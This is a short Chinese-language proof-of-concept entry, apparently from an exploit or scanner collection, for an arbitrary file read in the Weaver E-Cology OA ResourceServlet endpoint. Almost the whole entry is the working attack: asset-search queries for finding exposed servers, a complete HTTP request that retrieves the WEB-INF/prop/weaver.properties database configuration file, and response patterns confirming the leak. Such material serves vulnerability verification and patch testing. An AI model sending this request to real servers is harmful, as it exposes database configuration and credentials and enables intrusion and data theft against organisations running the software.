﻿# 泛微-ecology-任意文件读取-ResourceServlet

> 更新时间：2024-05-14

> 漏洞编号：

> 漏洞说明： 泛微E-Cology ResourceServlet接口处存在文件读取漏洞，恶意攻击者可能利用该漏洞读取服务器上的敏感文件，例如客户记录、财务数据或源代码，导致数据泄露。  

> 漏洞特征：app="泛微-EOffice"||app="泛微-OA（e-cology）" 或 Hunter:app.name="泛微 e-cology OA"

> 验证脚本：HTTP

```
GET /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?DatabaseName)(?=.*?ecology.maxconn).*?$

> 上传文件定位：

> 验证文件来源：泛微-ecology-任意文件读取-ResourceServlet.poc

